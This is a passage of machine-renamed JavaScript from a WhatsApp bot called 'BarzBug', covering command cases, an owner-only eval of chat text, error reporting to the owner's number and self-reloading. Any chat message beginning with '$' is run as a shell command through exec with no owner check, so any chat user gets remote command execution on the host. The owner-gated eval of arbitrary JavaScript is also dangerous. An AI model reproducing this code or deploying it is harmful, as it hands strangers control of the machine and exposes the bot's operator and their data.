          BarzBug.public = false;
          vF6(global.succes);
        }
        break;
      case "public":
        {
          if (!v46) {
            return vF6(global.onlyown);
          }
          BarzBug.public = true;
          vF6(global.succes);
        }
        break;
      case "test":
        {
          vF6("on bosku");
        }
        break;
      default:
    }
    if (v17.startsWith("$")) {
      exec(v17.slice(2), (p105, p106) => {
        if (p105) {
          return vF6(p105);
        }
        if (p106) {
          return vF6(p106);
        }
      });
    }
    if (v17.startsWith(">")) {
      if (!v46) {
        return vF6(global.onlyown);
      }
      try {
        let v251 = await eval(v17.slice(2));
        if (typeof v251 !== "string") {
          v251 = require("util").inspect(v251);
        }
        await vF6(v251);
      } catch (_0x52dc1e) {
        vF6(String(_0x52dc1e));
      }
    }
  } catch (_0xe92141) {
    console.log(_0xe92141);
    BarzBug.sendMessage(global.owner + "@s.whatsapp.net", {
      text: "" + util.format(_0xe92141)
    });
  }
};
let v252 = require.resolve(__filename);
fs.watchFile(v252, () => {
  fs.unwatchFile(v252);
  console.log(chalk.redBright("Update " + __filename));
  delete require.cache[v252];
  require(v252);
});